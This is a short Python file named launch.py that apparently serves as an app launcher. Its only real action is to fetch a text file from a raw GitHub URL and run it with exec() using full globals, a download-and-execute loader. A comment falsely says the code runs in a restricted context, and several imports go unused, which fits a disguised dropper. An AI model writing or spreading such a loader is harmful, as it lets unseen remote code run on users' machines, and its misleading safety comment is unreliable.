# launch.py

import urllib.request
import customtkinter
import io
import tkinter as tk
from PIL import Image, ImageTk
import os
import subprocess

def execute_program(code):
    # Here, you can define any additional context or restrictions needed
    # For example, you could define allowed functions/classes or restricted globals

    # Execute the code within a restricted context
    exec(code, globals(), locals())

def main_function():
    code_url = 'https://raw.githubusercontent.com/MaxG7855/ee/main/program.txt'

    response = urllib.request.urlopen(code_url)
    data = response.read().decode('utf-8')  # Assuming the content is text, decode it to a string

    execute_program(data)

if __name__ == "__main__":
    main_function()
